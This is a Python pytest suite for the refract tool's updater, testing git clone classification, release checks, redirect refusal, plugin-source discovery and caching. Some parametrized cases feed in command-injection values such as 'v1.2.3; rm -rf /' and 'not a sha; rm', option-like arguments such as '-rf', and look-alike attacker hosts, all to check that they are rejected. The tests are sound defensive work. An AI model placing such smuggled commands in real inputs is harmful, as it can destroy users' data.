"""Updater discovery, classification, and cache tests. Every path stays under tmp_path."""

from __future__ import annotations

import dataclasses
import json
import os
import shutil
import socket
import subprocess
import sys
import threading
import time
import urllib.request
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.request import Request

import pytest

from refract import cli, updater
from refract.updater import Install
from tests.launchers import install_launcher

REAL_OPEN_RELEASE = updater._open_release

GIT_ENV = {
    "GIT_AUTHOR_NAME": "t",
    "GIT_AUTHOR_EMAIL": "t@example.invalid",
    "GIT_COMMITTER_NAME": "t",
    "GIT_COMMITTER_EMAIL": "t@example.invalid",
    "GIT_CONFIG_GLOBAL": os.devnull,
    "GIT_CONFIG_SYSTEM": os.devnull,
}


class Env:
    def __init__(self, root: Path) -> None:
        self.root = root
        self.home = root / "home"
        self.refract_home = root / "refract-home"
        self.claude_dir = root / "claude-config"
        self.pi_dir = root / "pi-agent"
        self.stubs = root / "stubs"
        self.calls = root / "calls.log"
        self.home.mkdir()
        self.stubs.mkdir()
        self.real_git = shutil.which("git") or "git"
        path = [str(self.stubs)]
        if sys.platform != "win32":
            gitbin = root / "gitbin"
            gitbin.mkdir()
            (gitbin / "git").symlink_to(self.real_git)
            path.append(str(gitbin))
        else:
            path.append(str(Path(self.real_git).parent))
            powershell = shutil.which("pwsh") or shutil.which("powershell")
            if powershell:
                path.append(str(Path(powershell).parent))
            # kill_process_tree resolves taskkill.exe through PATH; a real Windows PATH always has System32.
            path.append(os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32"))
        self.path = os.pathsep.join(path)

    def stub(self, name: str, stdout: str = "", code: int = 0, body: str | None = None) -> None:
        """Install a stub executable that logs its argv and prints stdout.

        ``body`` is Python source run after the call is logged, with ``sys``, ``args`` and ``joined`` in scope.
        """
        data = self.root / f"{name}.out"
        data.write_text(stdout)
        script = body or f"sys.stdout.write(open({str(data)!r}).read())\nsys.exit({code})"
        path = self.stubs / f"{name}_stub.py"
        path.write_text(
            "import sys\n"
            "args = sys.argv[1:]\n"
            'joined = " ".join(args)\n'
            f'with open({str(self.calls)!r}, "a", newline="\\n") as log:\n'
            f'    log.write(f"{name} {{joined}}\\n")\n'
            f"{script}\n"
        )
        install_launcher(self.stubs, name, path)

    def call_log(self) -> list[str]:
        return self.calls.read_text().splitlines() if self.calls.exists() else []


@pytest.fixture
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Env:
    e = Env(tmp_path)
    monkeypatch.setenv("REFRACT_HOME", str(e.refract_home))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(e.claude_dir))
    monkeypatch.setenv("PI_CODING_AGENT_DIR", str(e.pi_dir))
    monkeypatch.setenv("HOME", str(e.home))
    monkeypatch.setenv("PATH", e.path)
    monkeypatch.setattr(Path, "home", lambda: e.home)
    for key, value in GIT_ENV.items():
        monkeypatch.setenv(key, value)
    # The installed refract distribution is an editable install of the real clone.
    # Never classify it: a test that wants a server install sets its own.
    def missing(name: str):
        raise updater.metadata.PackageNotFoundError(name)

    monkeypatch.setattr(updater.metadata, "distribution", missing)
    return e


@pytest.fixture(autouse=True)
def _no_network(monkeypatch: pytest.MonkeyPatch) -> None:
    def refuse(*_a: Any, **_k: Any):
        raise AssertionError("unexpected network call")

    monkeypatch.setattr(updater, "_open_release", refuse)
    monkeypatch.setattr(cli, "urlopen", refuse)


# --- git fixtures -------------------------------------------------------


def git(cwd: Path, *args: str) -> str:
    done = subprocess.run(
        ["git", "-C", str(cwd), *args], capture_output=True, text=True, check=True, env={**os.environ}
    )
    return done.stdout.strip()


def commit(repo: Path, name: str) -> str:
    (repo / name).write_text(name)
    git(repo, "add", name)
    git(repo, "commit", "-q", "-m", name)
    return git(repo, "rev-parse", "HEAD")


class Repos:
    def __init__(self, root: Path) -> None:
        self.bare = root / "origin.git"
        self.seed = root / "seed"
        self.clone = root / "clone"
        subprocess.run(["git", "init", "-q", "--bare", "-b", "main", str(self.bare)], check=True)
        subprocess.run(["git", "init", "-q", "-b", "main", str(self.seed)], check=True)
        commit(self.seed, "a")
        git(self.seed, "remote", "add", "origin", str(self.bare))
        git(self.seed, "push", "-q", "origin", "main")
        subprocess.run(["git", "clone", "-q", str(self.bare), str(self.clone)], check=True)

    def upstream_commit(self, name: str) -> str:
        sha = commit(self.seed, name)
        git(self.seed, "push", "-q", "origin", "main")
        return sha


@pytest.fixture
def repos(env: Env, tmp_path: Path) -> Repos:
    return Repos(tmp_path / "repos")


# --- clone classification -----------------------------------------------


def test_clone_current(repos: Repos) -> None:
    result = updater.classify_clone(repos.clone.resolve())
    assert (result.state, result.detail) == ("current", "up to date")


def test_clone_behind_is_update_with_upstream_commit(repos: Repos) -> None:
    sha = repos.upstream_commit("b")
    result = updater.classify_clone(repos.clone.resolve())
    assert result.state == "update"
    assert result.commit == sha[:12]


def test_clone_ahead_is_current(repos: Repos) -> None:
    commit(repos.clone, "local")
    assert updater.classify_clone(repos.clone.resolve()).state == "current"


def test_clone_diverged(repos: Repos) -> None:
    repos.upstream_commit("b")
    commit(repos.clone, "local")
    result = updater.classify_clone(repos.clone.resolve())
    assert (result.state, result.detail) == ("skipped", "diverged")


def test_clone_dirty(repos: Repos) -> None:
    repos.upstream_commit("b")
    (repos.clone / "scratch").write_text("x")
    result = updater.classify_clone(repos.clone.resolve())
    assert (result.state, result.detail) == ("skipped", "dirty")


def test_clone_detached(repos: Repos) -> None:
    git(repos.clone, "checkout", "-q", "--detach")
    result = updater.classify_clone(repos.clone.resolve())
    assert (result.state, result.detail) == ("skipped", "detached HEAD")


def test_clone_no_upstream(repos: Repos) -> None:
    git(repos.clone, "branch", "--unset-upstream")
    result = updater.classify_clone(repos.clone.resolve())
    assert (result.state, result.detail) == ("skipped", "no upstream")


@pytest.mark.parametrize("marker", ["MERGE_HEAD", "rebase-merge", "rebase-apply"])
def test_clone_unfinished_operation(repos: Repos, marker: str) -> None:
    git_dir = Path(git(repos.clone, "rev-parse", "--absolute-git-dir"))
    target = git_dir / marker
    target.mkdir() if marker != "MERGE_HEAD" else target.write_text("x")
    result = updater.classify_clone(repos.clone.resolve())
    assert (result.state, result.detail) == ("skipped", "unfinished operation")


def test_clone_unfinished_operation_wins_over_dirty(repos: Repos) -> None:
    git_dir = Path(git(repos.clone, "rev-parse", "--absolute-git-dir"))
    (git_dir / "MERGE_HEAD").write_text("x")
    (repos.clone / "scratch").write_text("x")
    assert updater.classify_clone(repos.clone.resolve()).detail == "unfinished operation"


def test_clone_fetch_failure(repos: Repos, tmp_path: Path) -> None:
    git(repos.clone, "remote", "set-url", "origin", str(tmp_path / "missing.git"))
    result = updater.classify_clone(repos.clone.resolve())
    assert (result.state, result.detail) == ("failed", "cannot check")


def test_clone_does_not_pull(repos: Repos) -> None:
    before = git(repos.clone, "rev-parse", "HEAD")
    repos.upstream_commit("b")
    updater.classify_clone(repos.clone.resolve())
    assert git(repos.clone, "rev-parse", "HEAD") == before


# --- release check ------------------------------------------------------


class FakeResponse:
    def __init__(self, body: bytes) -> None:
        self.body = body

    def read(self, size: int = -1) -> bytes:
        return self.body if size < 0 else self.body[:size]

    def __enter__(self) -> FakeResponse:
        return self

    def __exit__(self, *_a: object) -> None:
        return None


def release(monkeypatch: pytest.MonkeyPatch, body: Any = None, exc: Exception | None = None) -> list[Request]:
    seen: list[Request] = []

    def fake(request: Request, timeout: float):
        seen.append(request)
        if exc is not None:
            raise exc
        raw = body if isinstance(body, bytes) else json.dumps(body).encode()
        return FakeResponse(raw)

    monkeypatch.setattr(updater, "_open_release", fake)
    return seen


def test_release_newer_with_v_prefix(monkeypatch: pytest.MonkeyPatch) -> None:
    seen = release(monkeypatch, {"tag_name": "v2.6.0"})
    result = updater.check_release("2.5.0")
    assert (result.state, result.version) == ("update", "2.6.0")
    assert seen[0].full_url == updater.RELEASE_URL


def test_release_newer_without_prefix_compares_integers(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, {"tag_name": "2.10.0"})
    assert updater.check_release("2.9.0").state == "update"


def test_release_equal(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, {"tag_name": "v2.5.0"})
    assert updater.check_release("2.5.0").state == "current"


def test_release_older(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, {"tag_name": "v2.4.9"})
    assert updater.check_release("2.5.0").state == "current"


@pytest.mark.parametrize("flag", ["draft", "prerelease"])
def test_release_draft_and_prerelease_ignored(monkeypatch: pytest.MonkeyPatch, flag: str) -> None:
    release(monkeypatch, {"tag_name": "v9.0.0", flag: True})
    result = updater.check_release("2.5.0")
    assert (result.state, result.version) == ("current", None)


@pytest.mark.parametrize("tag", ["v2.6", "v1.2.3-rc1", "latest", "v1.2.3\n", "v1.2.3; rm -rf /", "", "V1.2.3"])
def test_release_invalid_tag_is_failed(monkeypatch: pytest.MonkeyPatch, tag: str) -> None:
    release(monkeypatch, {"tag_name": tag})
    result = updater.check_release("2.5.0")
    assert (result.state, result.detail, result.version) == ("failed", "cannot check", None)


def test_release_404_is_current(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, exc=HTTPError(updater.RELEASE_URL, 404, "nf", {}, None))  # type: ignore[arg-type]
    assert updater.check_release("2.5.0").state == "current"


@pytest.mark.parametrize("code", [403, 429, 500])
def test_release_http_errors_fail(monkeypatch: pytest.MonkeyPatch, code: int) -> None:
    release(monkeypatch, exc=HTTPError(updater.RELEASE_URL, code, "x", {}, None))  # type: ignore[arg-type]
    result = updater.check_release("2.5.0")
    assert (result.state, result.detail) == ("failed", "cannot check")


def test_release_url_error_fails(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, exc=URLError("offline"))
    assert updater.check_release("2.5.0").state == "failed"


@pytest.mark.parametrize("body", [b"{not json", b"[]", b'{"tag_name": 5}', b"null"])
def test_release_malformed_body_fails(monkeypatch: pytest.MonkeyPatch, body: bytes) -> None:
    release(monkeypatch, body=body)
    assert updater.check_release("2.5.0").state == "failed"


def test_release_oversized_body_fails(monkeypatch: pytest.MonkeyPatch) -> None:
    padding = " " * (updater.MAX_RELEASE_BYTES + 1)
    response = FakeResponse((json.dumps({"tag_name": "v9.9.9"}) + padding).encode())
    sizes: list[int] = []
    read = response.read
    response.read = lambda size=-1: (sizes.append(size), read(size))[1]  # type: ignore[method-assign]
    monkeypatch.setattr(updater, "_open_release", lambda _request, _timeout: response)
    assert updater.check_release("2.5.0").state == "failed"
    assert sizes == [updater.MAX_RELEASE_BYTES + 1]


def test_release_body_at_limit_is_accepted(monkeypatch: pytest.MonkeyPatch) -> None:
    raw = json.dumps({"tag_name": "v9.9.9"}).encode()
    release(monkeypatch, body=raw + b" " * (updater.MAX_RELEASE_BYTES - len(raw)))
    assert updater.check_release("2.5.0").state == "update"


def test_release_unknown_installed_version_fails(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, {"tag_name": "v9.9.9"})
    assert updater.check_release(None).state == "failed"


@pytest.mark.parametrize("target", ["https://evil.example/x", "http://api.github.com/x", "https://api.github.com.evil.example/x"])
def test_redirect_handler_refuses_other_hosts(target: str) -> None:
    handler = updater._SameHostRedirect()
    request = Request(updater.RELEASE_URL)
    with pytest.raises(URLError):
        handler.redirect_request(request, None, 302, "Found", {}, target)


def test_redirect_handler_allows_same_host() -> None:
    handler = updater._SameHostRedirect()
    new = handler.redirect_request(
        Request(updater.RELEASE_URL), None, 302, "Found", {}, "https://api.github.com/repos/other"
    )
    assert new is not None
    assert new.full_url == "https://api.github.com/repos/other"


def test_release_cross_host_redirect_fails(monkeypatch: pytest.MonkeyPatch) -> None:
    release(monkeypatch, exc=URLError("cross-host redirect refused"))
    assert updater.check_release("2.5.0").state == "failed"


# --- server discovery ---------------------------------------------------


class FakeDist:
    def __init__(self, direct: Any, version: str = "2.5.0") -> None:
        self.version = version
        self._direct = direct

    def read_text(self, name: str) -> str | None:
        assert name == "direct_url.json"
        return None if self._direct is None else json.dumps(self._direct)


def use_dist(monkeypatch: pytest.MonkeyPatch, direct: Any, version: str = "2.5.0") -> None:
    monkeypatch.setattr(updater.metadata, "distribution", lambda _n: FakeDist(direct, version))


def test_server_editable_clone(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    sub = repos.clone / "server"
    sub.mkdir()
    use_dist(monkeypatch, {"url": sub.as_uri(), "dir_info": {"editable": True}})
    server = updater.discover_server()
    assert (server.source, server.state, server.path, server.version) == (
        "clone", None, repos.clone.resolve(), "2.5.0",
    )


def test_server_editable_outside_git(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    plain = tmp_path / "plain"
    plain.mkdir()
    use_dist(monkeypatch, {"url": plain.as_uri(), "dir_info": {"editable": True}})
    server = updater.discover_server()
    assert (server.source, server.state, server.detail) == ("clone", "skipped", "not a git clone")


def test_server_non_editable_file_is_unknown(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    use_dist(monkeypatch, {"url": tmp_path.as_uri(), "dir_info": {}})
    assert updater.discover_server().source == "unknown"


@pytest.mark.parametrize(
    "direct",
    [
        {"url": "https://github.com/sitien173/refract", "vcs_info": {"vcs": "git"}},
        {"url": "https://github.com/sitien173/refract.git", "vcs_info": {"vcs": "git"}},
        {"url": "https://github.com/sitien173/refract/archive/refs/tags/v2.5.0.tar.gz", "archive_info": {}},
    ],
)
def test_server_github(env: Env, monkeypatch: pytest.MonkeyPatch, direct: dict[str, Any]) -> None:
    use_dist(monkeypatch, direct)
    assert updater.discover_server().source == "github"


@pytest.mark.parametrize(
    "direct",
    [
        {"url": "https://github.com/other/refract", "vcs_info": {}},
        {"url": "https://github.com/sitien173/refract-evil", "vcs_info": {}},
        {"url": "https://evil.example/sitien173/refract", "vcs_info": {}},
        {"no": "url"},
        None,
    ],
)
def test_server_unknown(env: Env, monkeypatch: pytest.MonkeyPatch, direct: Any) -> None:
    use_dist(monkeypatch, direct)
    server = updater.discover_server()
    assert (server.source, server.state) == ("unknown", "manual")


def test_server_not_installed(env: Env) -> None:
    assert updater.discover_server().source == "unknown"


def test_uv_tool_prefix_detected(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    tool_dir = tmp_path / "uvtools"
    (tool_dir / "refract").mkdir(parents=True)
    env.stub("uv", f"{tool_dir}\n")
    use_dist(monkeypatch, None)
    monkeypatch.setattr(sys, "prefix", str(tool_dir / "refract"))
    assert updater.discover_server().uv_tool is True
    assert env.call_log() == ["uv tool dir"]


def test_uv_tool_prefix_elsewhere_or_uv_missing(env: Env, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(sys, "prefix", str(tmp_path / "venv"))
    assert updater.discover_server().uv_tool is False
    env.stub("uv", str(tmp_path / "uvtools"))
    assert updater.discover_server().uv_tool is False


# --- Claude Code discovery ----------------------------------------------


def claude_stub(env: Env, plugins: Any, markets: Any) -> None:
    (env.root / "plugins.json").write_text(json.dumps(plugins))
    (env.root / "markets.json").write_text(json.dumps(markets))
    env.stub(
        "claude",
        body=(
            f'files = {{"plugin list --json": {str(env.root / "plugins.json")!r}, '
            f'"plugin marketplace list --json": {str(env.root / "markets.json")!r}}}\n'
            "if joined not in files:\n"
            "    sys.exit(9)\n"
            "sys.stdout.write(open(files[joined]).read())"
        ),
    )


def seed_installed(directory: Path, records: dict[str, Any]) -> None:
    (directory / "plugins").mkdir(parents=True, exist_ok=True)
    (directory / "plugins" / "installed_plugins.json").write_text(json.dumps({"version": 2, "plugins": records}))


PLUGIN = [{"id": "refract@refract", "version": "2.5.0", "scope": "user", "enabled": True}]
SHA = "a" * 40


def test_claude_clone_marketplace_with_sha_and_scope(env: Env, repos: Repos) -> None:
    claude_stub(env, PLUGIN, [{"name": "refract", "source": "directory", "path": str(repos.clone)}])
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "user", "gitCommitSha": SHA}]})
    [install] = updater.discover_claude()
    assert (install.name, install.source, install.state) == ("claude", "clone", None)
    assert install.path == repos.clone.resolve()
    assert (install.scope, install.installed_sha, install.version) == ("user", SHA, "2.5.0")
    assert env.call_log() == ["claude plugin list --json", "claude plugin marketplace list --json"]


def test_claude_default_config_dir_is_home_dot_claude(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("CLAUDE_CONFIG_DIR")
    claude_stub(env, PLUGIN, [{"name": "refract", "path": str(repos.clone)}])
    seed_installed(env.home / ".claude", {"refract@refract": [{"scope": "user", "gitCommitSha": "b" * 40}]})
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "user", "gitCommitSha": SHA}]})
    assert updater.discover_claude()[0].installed_sha == "b" * 40


def test_claude_config_dir_override_wins(env: Env, repos: Repos) -> None:
    claude_stub(env, PLUGIN, [{"name": "refract", "path": str(repos.clone)}])
    seed_installed(env.home / ".claude", {"refract@refract": [{"scope": "user", "gitCommitSha": "b" * 40}]})
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "user", "gitCommitSha": SHA}]})
    assert updater.discover_claude()[0].installed_sha == SHA


def test_claude_invalid_sha_is_dropped(env: Env, repos: Repos) -> None:
    claude_stub(env, PLUGIN, [{"name": "refract", "path": str(repos.clone)}])
    seed_installed(env.claude_dir, {"refract@refract": [{"scope": "user", "gitCommitSha": "not a sha; rm"}]})
    assert updater.discover_claude()[0].installed_sha is None


def test_claude_github_marketplace(env: Env) -> None:
    claude_stub(env, PLUGIN, [{"name": "refract", "source": "github", "repo": "sitien173/refract"}])
    [install] = updater.discover_claude()
    assert (install.source, install.state) == ("github", None)


@pytest.mark.parametrize(
    "market",
    [
        {"name": "refract", "source": "git", "url": "https://evil.example/refract.git"},
        {"name": "refract", "source": "github", "repo": "other/refract"},
        {"name": "refract", "source": "github", "repo": "-sitien173/refract"},
        {"name": "refract", "source": "directory", "path": "-rf"},
        {"name": "refract", "source": "npm"},
        {"name": "other", "source": "github", "repo": "sitien173/refract"},
    ],
)
def test_claude_unrecognized_marketplace_is_untrusted(env: Env, market: dict[str, str]) -> None:
    claude_stub(env, PLUGIN, [market])
    [install] = updater.discover_claude()
    assert (install.state, install.detail) == ("skipped", "untrusted source")


def test_claude_plugin_not_installed(env: Env) -> None:
    claude_stub(env, [{"id": "other@market"}], [])
    assert updater.discover_claude() == []


def test_claude_missing_executable(env: Env) -> None:
    assert updater.discover_claude() == []


@pytest.mark.parametrize("stdout, code", [("", 1), ("not json", 0)])
def test_claude_failure_modes(env: Env, stdout: str, code: int) -> None:
    env.stub("claude", stdout, code)
    [install] = updater.discover_claude()
    assert install.state == "failed"


def test_claude_launcher_resolved_by_which_runs(env: Env) -> None:
    """The host tool is whatever `shutil.which` resolves: a `.cmd` shim on Windows, a script elsewhere."""
    env.stub("claude", json.dumps(PLUGIN))
    resolved = shutil.which("claude")
    assert resolved is not None
    assert Path(resolved).parent == env.stubs
    status, plugins = updater._host_json("claude", "plugin", "list", "--json")
    assert (status, plugins) == ("ok", PLUGIN)
    assert env.call_log() == ["claude plugin list --json"]


def test_claude_timeout(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    env.stub("claude", body="import time\ntime.sleep(30)")
    monkeypatch.setattr(updater, "SUBPROCESS_TIMEOUT_S", 0.3)
    started = time.monotonic()
    [install] = updater.discover_claude()
    assert time.monotonic() - started < 5
    assert (install.state, install.detail) == ("failed", "cannot list plugins: timeout")


def test_claude_marketplace_list_failure(env: Env) -> None:
    env.stub(
        "claude",
        body=f"if joined != 'plugin list --json':\n    sys.exit(3)\nprint({json.dumps(PLUGIN)!r})",
    )
    [install] = updater.discover_claude()
    assert install.state == "failed"


# --- Pi discovery -------------------------------------------------------


def pi_settings(env: Env, packages: Any) -> None:
    env.pi_dir.mkdir(parents=True, exist_ok=True)
    (env.pi_dir / "settings.json").write_text(json.dumps({"packages": packages}))


def make_package(path: Path, name: str = "refract") -> None:
    path.mkdir(parents=True, exist_ok=True)
    (path / "package.json").write_text(json.dumps({"name": name}))


def test_pi_relative_source_resolves_against_settings_dir(env: Env, repos: Repos) -> None:
    make_package(repos.clone / "plugin")
    relative = os.path.relpath(repos.clone / "plugin", env.pi_dir)
    pi_settings(env, [relative])
    [install] = updater.discover_pi()
    assert (install.name, install.source, install.state) == ("pi", "clone", None)
    assert install.path == repos.clone.resolve()


def test_pi_object_entry_and_absolute_path(env: Env, repos: Repos) -> None:
    make_package(repos.clone / "plugin")
    pi_settings(env, [{"source": str(repos.clone / "plugin")}])
    assert updater.discover_pi()[0].path == repos.clone.resolve()


def test_pi_github_sources(env: Env) -> None:
    pi_settings(env, ["https://github.com/sitien173/refract", "git:github.com/sitien173/refract.git"])
    assert [(i.source, i.state) for i in updater.discover_pi()] == [("github", None)] * 2


@pytest.mark.parametrize(
    "source",
    ["-evil", "--extension=x", "https://github.com/sitien173/refract@main", "git:evil.example/refract", "npm:refract-evil"],
)
def test_pi_untrusted_sources(env: Env, source: str) -> None:
    pi_settings(env, [source])
    [install] = updater.discover_pi()
    assert (install.name, install.state, install.detail) == ("pi", "skipped", "untrusted source")


def test_pi_ignores_unrelated_packages(env: Env, tmp_path: Path) -> None:
    make_package(tmp_path / "other", "not-refract")
    pi_settings(env, ["npm:left-pad", str(tmp_path / "other"), 7, {"nosource": 1}])
    assert updater.discover_pi() == []


def test_pi_missing_settings(env: Env) -> None:
    assert updater.discover_pi() == []


def test_pi_malformed_settings(env: Env) -> None:
    env.pi_dir.mkdir()
    (env.pi_dir / "settings.json").write_text("{")
    assert updater.discover_pi()[0].state == "failed"


def test_pi_default_dir_is_home_pi_agent(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("PI_CODING_AGENT_DIR")
    default = env.home / ".pi" / "agent"
    default.mkdir(parents=True)
    (default / "settings.json").write_text(json.dumps({"packages": ["-x"]}))
    assert updater.discover_pi()[0].state == "skipped"


def test_pi_local_package_outside_git(env: Env, tmp_path: Path) -> None:
    make_package(tmp_path / "loose")
    pi_settings(env, [str(tmp_path / "loose")])
    assert updater.discover_pi()[0].detail == "not a git clone"


# --- Codex and agy ------------------------------------------------------


@pytest.mark.parametrize("host", ["codex", "agy"])
def test_detect_only_hosts(env: Env, host: str) -> None:
    env.stub(host, json.dumps([{"name": "refract", "version": "1"}]))
    [install] = updater.discover_detect_only(host)
    assert (install.name, install.state) == (host, "manual")
    assert env.call_log() == [f"{host} plugin list --json"]


@pytest.mark.parametrize("host", ["codex", "agy"])
def test_detect_only_not_installed_or_absent(env: Env, host: str) -> None:
    assert updater.discover_detect_only(host) == []
    env.stub(host, json.dumps([{"name": "other"}]))
    assert updater.discover_detect_only(host) == []


@pytest.mark.parametrize("host", ["codex", "agy"])
def test_detect_only_failure(env: Env, host: str) -> None:
    env.stub(host, "", 2)
    assert updater.discover_detect_only(host)[0].state == "failed"
    env.stub(host, "{bad", 0)
    assert updater.discover_detect_only(host)[0].state == "failed"


# --- classify -----------------------------------------------------------


def test_shared_clone_is_classified_once(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    calls: list[Path] = []

    def fake(root: Path) -> updater._CloneResult:
        calls.append(root)
        return updater._CloneResult("update", "behind upstream", "abc1234")

    monkeypatch.setattr(updater, "classify_clone", fake)
    installs = [Install(n, "clone", None, "", path=tmp_path) for n in ("server", "claude", "pi")]
    result = updater.classify(installs)
    assert calls == [tmp_path]
    assert [c.state for c in result.components] == ["update"] * 3
    assert result.latest_commit == "abc1234"


def test_release_is_fetched_once_per_run(monkeypatch: pytest.MonkeyPatch) -> None:
    seen = release(monkeypatch, {"tag_name": "v2.6.0"})
    installs = [
        Install("server", "github", None, "", version="2.5.0"),
        Install("pi", "github", None, "", ref="x"),
    ]
    result = updater.classify(installs)
    assert len(seen) == 1
    assert [c.state for c in result.components] == ["update", "update"]
    assert result.latest_version == "2.6.0"


def test_preset_states_pass_through_without_io(monkeypatch: pytest.MonkeyPatch) -> None:
    installs = [Install("codex", "unknown", "manual", "m"), Install("pi", "unknown", "skipped", "untrusted source")]
    result = updater.classify(installs)
    assert [(c.state, c.detail) for c in result.components] == [("manual", "m"), ("skipped", "untrusted source")]
    assert (result.latest_version, result.latest_commit) == (None, None)


# --- cache and CLI ------------------------------------------------------


def cache_file(env: Env) -> Path:
    return env.refract_home / "update-check.json"


def read(env: Env) -> dict[str, Any]:
    return json.loads(cache_file(env).read_text())


def clone_server(monkeypatch: pytest.MonkeyPatch, repos: Repos) -> None:
    sub = repos.clone / "server"
    sub.mkdir(exist_ok=True)
    use_dist(monkeypatch, {"url": sub.as_uri(), "dir_info": {"editable": True}})


def test_check_writes_schema_1_cache(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]) -> None:
    clone_server(monkeypatch, repos)
    sha = repos.upstream_commit("b")
    with pytest.raises(SystemExit) as exit_info:
        cli.main(["update", "--check"])
    assert exit_info.value.code == 0
    data = read(env)
    assert set(data) == {"schema", "checked_at", "update_available", "latest_version", "latest_commit", "components"}
    assert data["schema"] == 1
    assert data["update_available"] is True
    assert data["latest_commit"] == sha[:12]
    assert data["components"] == [
        {"name": "server", "source": "clone", "state": "update", "detail": "behind upstream"}
    ]
    assert capsys.readouterr().out.strip() == "server: update (behind upstream)"


def test_check_creates_missing_home_and_ignores_config(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    assert not env.refract_home.exists()

    def boom(*_a: Any, **_k: Any):
        raise AssertionError("config loaded")

    monkeypatch.setattr(cli, "load_config", boom)
    release(monkeypatch, exc=HTTPError(updater.RELEASE_URL, 404, "nf", {}, None))  # type: ignore[arg-type]
    use_dist(monkeypatch, {"url": "https://github.com/sitien173/refract", "vcs_info": {}})
    with pytest.raises(SystemExit) as exit_info:
        cli.main(["update", "--check"])
    assert exit_info.value.code == 0
    assert read(env)["components"][0]["state"] == "current"
    assert (env.refract_home / "config.toml").exists() is False


def test_check_never_changes_clone_or_contacts_daemon(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    repos.upstream_commit("b")
    head = git(repos.clone, "rev-parse", "HEAD")
    env.stub("claude", body="sys.exit(9)")
    def refuse(*_a: Any, **_k: Any):
        raise AssertionError("daemon contact")

    monkeypatch.setattr(urllib.request, "urlopen", refuse)
    monkeypatch.setattr(socket, "create_connection", refuse)
    updater.run_check(out=lambda _l: None)
    assert git(repos.clone, "rev-parse", "HEAD") == head
    # cli.urlopen is the daemon path and the autouse fixture makes it raise.


def test_second_run_within_24h_makes_no_calls(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    env.stub("claude", "[]")
    updater.run_check(now=lambda: 1000.0, out=lambda _l: None)
    first = read(env)
    calls = env.call_log()

    def refuse(*_a: Any, **_k: Any):
        raise AssertionError("subprocess in throttled run")

    monkeypatch.setattr(updater, "_run", refuse)
    lines: list[str] = []
    assert updater.run_check(now=lambda: 1000.0 + updater.CHECK_TTL_S - 1, out=lines.append) == 0
    assert read(env) == first
    assert env.call_log() == calls
    assert len(lines) == 1


def test_run_after_24h_checks_again(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    updater.run_check(now=lambda: 1000.0, out=lambda _l: None)
    updater.run_check(now=lambda: 1000.0 + updater.CHECK_TTL_S, out=lambda _l: None)
    assert read(env)["checked_at"] == 1000.0 + updater.CHECK_TTL_S


def test_force_bypasses_throttle(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    updater.run_check(now=lambda: 1000.0, out=lambda _l: None)
    repos.upstream_commit("b")
    updater.run_check(force=True, now=lambda: 1001.0, out=lambda _l: None)
    data = read(env)
    assert data["checked_at"] == 1001.0
    assert data["update_available"] is True


@pytest.mark.parametrize("argv, force", [(["update", "--check"], False), (["update", "--check", "--force"], True)])
def test_cli_passes_force_flag(argv: list[str], force: bool, monkeypatch: pytest.MonkeyPatch) -> None:
    seen: list[bool] = []
    monkeypatch.setattr(updater, "run_check", lambda force: seen.append(force) or 0)
    with pytest.raises(SystemExit) as exit_info:
        cli.main(argv)
    assert exit_info.value.code == 0
    assert seen == [force]


def test_future_checked_at_does_not_throttle(env: Env, repos: Repos, monkeypatch: pytest.MonkeyPatch) -> None:
    clone_server(monkeypatch, repos)
    env.refract_home.mkdir()
    cache_file(env).write_text(json.dumps({"schema": 1, "checked_at": 10**12}))
    updater.run_check(now=lambda: 5.0, out=lambda _l: None)
    assert read(env)["checked_at"] == 5.0


def test_failed_check_advances_checked_at_and_keeps_latest(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    env.refract_home.mkdir()
    cache_file(env).write_text(
        json.dumps(
            {"schema": 1, "checked_at": 1.0, "update_available": False, "latest_version": "1.2.3",
             "latest_commit": "abcdef1", "components": []}
        )
    )
    use_dist(monkeypatch, {"url": "https://github.com/sitien173/refract", "vcs_info": {}})
    release(monkeypatch, exc=URLError("offline"))
    lines: list[str] = []
    assert updater.run_check(now=lambda: 2.0 + updater.CHECK_TTL_S, out=lines.append) == 0
    data = read(env)
    assert data["checked_at"] == 2.0 + updater.CHECK_TTL_S
    assert (data["latest_version"], data["latest_commit"]) == ("1.2.3", "abcdef1")
    assert data["components"][0]["state"] == "failed"
    assert lines == ["server: failed (cannot check)"]


def test_attempt_is_recorded_before_discovery(env: Env, monkeypatch: pytest.MonkeyPatch) -> None:
    def crash() -> list[Install]:
        raise RuntimeError("boom")

    monkeypatch.setattr(updater, "discover", crash)
    with pytest.raises(RuntimeError):
        updater.run_check(now=lambda: 77.0, out=lambda _l: None)
    assert read(env)["checked_at"] == 77.0


